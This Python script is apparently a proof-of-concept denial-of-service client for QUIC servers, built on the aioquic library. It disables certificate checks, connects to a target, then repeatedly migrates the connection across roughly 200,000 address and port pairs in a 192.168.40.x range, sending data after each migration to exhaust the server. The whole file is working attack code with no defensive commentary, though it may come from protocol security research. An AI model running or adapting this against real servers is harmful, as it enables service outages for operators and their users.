import argparse
import asyncio
import logging
import pickle
import ssl
import struct
from typing import Optional, cast

from aioquic.asyncio.client import connect, change_transport
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.logger import QuicFileLogger
from multiprocessing import Process
from aioquic.quic.connection import QuicConnectionState

import time

logger = logging.getLogger("client")

class DosClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None

    async def send(self, d) -> None:
        d = d%65536
        data = int.to_bytes(d, 4, "big")
        data = struct.pack("!H", len(data)) + data

        if self.stream_id == None:
            self.stream_id = self._quic.get_next_available_stream_id()
        self._quic.send_stream_data(self.stream_id, data, end_stream=False)
        self.transmit()

        return


def save_session_ticket(ticket):
    """
    Callback which is invoked by the TLS engine when a new session ticket
    is received.
    """
    logger.info("New session ticket received")
    # if args.session_ticket:
        # with open(args.session_ticket, "wb") as fp:
        #     pickle.dump(ticket, fp)


async def main(
    host: str,
    port: int,
    transport_addr: list
) -> None:
    logger.debug(f"Connecting to {host}:{port}")

    if True:
        print("Starting a connection")
        try:
            configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
            configuration.verify_mode = ssl.CERT_NONE
            async with connect(
                host,
                port,
                configuration=configuration,
                session_ticket_handler=save_session_ticket,
                create_protocol=DosClientProtocol,
                local_port=0
            ) as client:
                client = cast(DosClientProtocol, client)

                i = 0
                for ip, port in transport_addr:
                    host_str = "::ffff:" + str(ip)
                    client._transport.close()
                    if client._quic._state == QuicConnectionState.TERMINATED:
                        transport_addr = transport_addr[i:] + transport_addr[:i]
                        logger.info("Connection Terminated")
                        break

                    try:
                        await change_transport(client, port, host_str)
                        logger.info(f"Changed Transport to {ip}:{port}")
                        i+=1
                    except Exception as e:
                        print("EXCEPTION:", e)
                        continue
                    logger.info("Sending Data to Server: " + str(i))
                    await client.send(i)
                    asyncio.sleep(0.001)
        except ConnectionError:
            print("EXCEPTION: Connection Error")
            # continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="QUIC DOS Demo")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="The remote peer's host name or IP address",
    )
    parser.add_argument(
        "--port", type=int, default=853, help="The remote peer's port number"
    )
    
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="increase logging verbosity"
    )

    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    
    transport = []
    for ipLast in range(128, 134):
        for port in range(30000, 64000):
            transport.append(("192.168.40." + str(ipLast), port))

    asyncio.run(
            main(
                host=args.host,
                port=args.port,
                transport_addr = transport
        )
    )
